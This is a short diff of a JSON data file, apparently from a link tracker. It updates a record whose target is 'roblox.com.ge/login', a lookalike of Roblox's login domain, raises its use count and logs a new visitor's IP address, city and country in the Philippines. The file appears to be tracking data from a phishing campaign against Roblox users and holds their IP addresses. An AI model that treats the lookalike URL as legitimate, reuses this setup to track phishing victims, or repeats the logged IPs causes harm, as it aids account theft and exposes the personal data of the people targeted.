@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1416,
+    "useCount": 1417,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11494,6 +11494,14 @@
         "ip": "112.207.171.115",
         "country": "Philippines",
         "city": "Paranaque City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777428650238,
+        "ip": "150.228.183.172",
+        "country": "Philippines",
+        "city": "Manila",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
